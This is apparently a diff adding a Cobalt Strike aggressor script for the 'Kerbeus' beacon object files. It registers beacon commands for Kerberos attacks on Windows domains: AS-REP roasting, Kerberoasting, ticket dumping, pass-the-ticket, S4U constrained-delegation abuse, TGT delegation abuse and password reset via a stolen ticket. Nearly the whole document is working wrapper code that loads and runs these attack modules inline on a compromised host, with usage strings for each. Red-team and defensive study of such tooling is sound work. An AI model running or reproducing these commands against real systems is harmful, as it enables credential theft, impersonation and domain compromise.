@@ -1,0 +1,392 @@
+beacon_command_register("krb_asreproasting", "Perform AS-REP roasting",
+	"Perform AS-REP roasting:\n\n" .
+	"    krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN]\n\n" );
+
+alias krb_asreproasting {
+	$bid = $1;
+    $input = substr($0, 18);
+
+	$handle = openf(script_resource("_bin/asreproasting." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus ASREPROASTING by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+beacon_command_register("krb_asktgt", "Retrieve a TGT",
+	"Retrieve a TGT:\n\n" .
+	"    krb_asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]\n" .
+	"    krb_asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n" .
+	"    krb_asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n" .
+	"    krb_asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]\n\n" );
+
+alias krb_asktgt {
+	$bid = $1;
+    $input = substr($0, 11);
+
+	$handle = openf(script_resource("_bin/asktgt." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus ASKTGT by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_asktgs", "Retrieve a TGS",
+	"Retrieve a TGS:\n\n" .
+	"    krb_asktgs /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]\n\n" );
+
+alias krb_asktgs {
+	$bid = $1;
+    $input = substr($0, 11);
+
+	$handle = openf(script_resource("_bin/asktgs." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus ASKTGS by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_changepw", "Reset a user's password from a supplied TGT",
+	"Reset a user's password from a supplied TGT:\n\n" .
+	"    krb_changepw /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]\n\n");
+
+alias krb_changepw {
+	$bid = $1;
+    $input = substr($0, 13);
+
+	$handle = openf(script_resource("_bin/changepw." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus CHANGEPW by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_describe", "Parse and describe a ticket",
+	"Parse and describe a ticket:\n\n" .
+	"    krb_describe /ticket:BASE64\n\n");
+
+alias krb_describe {
+	$bid = $1;
+    $input = substr($0, 13);
+
+	$handle = openf(script_resource("_bin/describe." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus DESCRIBE by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_dump", "Dump tickets",
+	"Dump tickets:\n\n" .
+	"    krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n\n");
+
+alias krb_dump {
+	$bid = $1;
+    $input = substr($0, 9);
+
+	$handle = openf(script_resource("_bin/dump." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus DUMP by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_hash", "Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes",
+	"Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes:\n\n" .
+	"    krb_hash /password:PASSWORD [/user:USER] [/domain:DOMAIN]\n\n");
+
+alias krb_hash {
+	$bid = $1;
+    $input = substr($0, 9);
+
+	$handle = openf(script_resource("_bin/hash." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus HASH by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_kerberoasting", "Perform Kerberoasting",
+	"Perform Kerberoasting:\n\n" .
+	"    krb_kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n" .
+	"    krb_kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC]\n\n");
+
+alias krb_kerberoasting {
+	$bid = $1;
+    $input = substr($0, 18);
+
+	$handle = openf(script_resource("_bin/kerberoasting." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus KERBEROASTING by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_klist", "List tickets",
+	"List tickets:\n\n" .
+	"    krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n\n");
+
+alias krb_klist {
+	$bid = $1;
+    $input = substr($0, 10);
+
+	$handle = openf(script_resource("_bin/klist." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus KLIST by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_ptt", "Submit a TGT",
+	"Submit a TGT:\n\n" .
+	"    krb_ptt /ticket:BASE64 [/luid:LOGONID]\n\n");
+
+alias krb_ptt {
+	$bid = $1;
+    $input = substr($0, 8);
+
+	$handle = openf(script_resource("_bin/ptt." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus PTT by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_purge", "Purge tickets",
+	"Purge tickets:\n\n" .
+	"    krb_purge /ticket:BASE64 [/luid:LOGONID]\n\n");
+
+alias krb_purge {
+	$bid = $1;
+    $input = substr($0, 10);
+
+	$handle = openf(script_resource("_bin/purge." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus PURGE by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_renew", "Renew a TGT",
+	"Renew a TGT:\n\n" .
+	"    krb_renew /ticket:BASE64 [/dc:DC] [/ptt]\n\n");
+
+alias krb_renew {
+	$bid = $1;
+    $input = substr($0, 10);
+
+	$handle = openf(script_resource("_bin/renew." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus RENEW by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_s4u", "Constrained delegation abuse:",
+	" Perform S4U constrained delegation abuse:\n\n" .
+    "    krb_s4u /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]\n" .
+#    "        krb_s4u /user:USER {/aes256:HASH | /rc4:HASH} /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]\n" .
+    "\n");
+
+alias krb_s4u {
+	$bid = $1;
+    $input = substr($0, 8);
+
+	$handle = openf(script_resource("_bin/s4u." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus S4U by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_cross_s4u", "Constrained delegation abuse across domains:",
+	" Perform S4U constrained delegation abuse across domains:\n\n" .
+    "    krb_cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]\n\n");
+
+alias krb_cross_s4u {
+	$bid = $1;
+    $input = substr($0, 14);
+
+	$handle = openf(script_resource("_bin/cross_s4u." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus CROSS_S4U by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_tgtdeleg", "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API",
+	"Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API:\n\n" .
+	"    krb_tgtdeleg [/target:SPN]\n\n");
+
+alias krb_tgtdeleg {
+	$bid = $1;
+    $input = substr($0, 13);
+
+	$handle = openf(script_resource("_bin/tgtdeleg." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus TGTDELEG by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_triage", "List tickets in table format",
+	"List tickets in table format:\n\n" .
+	"    krb_triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n\n");
+
+alias krb_triage {
+	$bid = $1;
+    $input = substr($0, 11);
+
+	$handle = openf(script_resource("_bin/triage." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", $input);
+
+	blog($bid, "Kerbeus TRIAGE by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+#####
+
+beacon_command_register("kerbeus", "Kerbeus help menu",
+    "\nKerbeus BOF by HackerRalf help: \n\n" .
+    " Ticket requests and renewals:\n" .
+    "\n" .
+    "    Retrieve a TGT\n" .
+    "        krb_asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]\n" .
+    "        krb_asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n" .
+    "        krb_asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n" .
+    "        krb_asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]\n" .
+    "\n" .
+    "    Retrieve a TGS\n" .
+    "        krb_asktgs /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]\n" .
+    "\n" .
+    "    Renew a TGT\n" .
+    "        krb_renew /ticket:BASE64 [/dc:DC] [/ptt]\n" .
+    "\n" .
+    " Constrained delegation abuse:\n" .
+    "\n" .
+    "    Perform S4U constrained delegation abuse:\n" .
+    "        krb_s4u /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]\n" .
+#    "        krb_s4u /user:USER {/aes256:HASH | /rc4:HASH} /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]\n" .
+    "\n" .
+    "    Perform S4U constrained delegation abuse across domains:\n" .
+    "        krb_cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]\n" .
+    "\n" .
+    " Ticket management:\n" .
+    "\n" .
+    "    Submit a TGT\n" .
+    "        krb_ptt /ticket:BASE64 [/luid:LOGONID]\n" .
+    "\n" .
+    "    Purge tickets\n" .
+    "        krb_purge [/luid:LOGONID]\n" .
+    "\n" .
+    "    Parse and describe a ticket\n" .
+    "        krb_describe /ticket:BASE64\n" .
+    "\n" .
+    "    Triage tickets\n" .
+    "        krb_triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n" .
+    "\n" .
+    "    List tickets\n" .
+    "        krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n" .
+    "\n" .
+    "    Dump tickets\n" .
+    "        krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n" .
+    "\n" .
+    "    Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API\n" .
+    "        krb_tgtdeleg [/target:SPN]\n" .
+    "\n" .
+    " Roasting:\n" .
+    "\n" .
+    "    Perform Kerberoasting:\n" .
+    "        krb_kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n" .
+    "        krb_kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC]\n" .
+    "\n" .
+    "    Perform AS-REP roasting:\n" .
+    "        krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN] [/aes]\n" .
+    "\n" .
+    " Miscellaneous:\n" .
+    "\n" .
+    "    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes:\n" .
+    "        krb_hash /password:PASSWORD [/user:USER] [/domain:DOMAIN]\n" .
+    "\n" .
+    "    Reset a user's password from a supplied TGT\n" .
+    "        krb_changepw /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]\n" .
+    "\n");
